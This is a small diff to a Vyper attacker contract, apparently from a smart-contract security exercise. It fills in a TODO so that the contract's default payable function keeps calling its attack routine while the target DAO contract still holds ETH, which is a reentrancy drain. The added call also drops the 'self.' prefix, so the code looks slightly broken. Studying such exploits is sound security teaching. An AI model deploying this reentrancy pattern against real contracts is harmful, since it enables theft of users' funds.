@@ -42,10 +42,10 @@ def attack(dao_address:address):
 @payable
 def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
-    flag: bool = True
+    
     # TODO: Add code here to complete the recursive call
-    if (flag):
-        flag = self._attack()
+    if (self.dao_address.balance>0):
+        _attack()
         
     
     pass
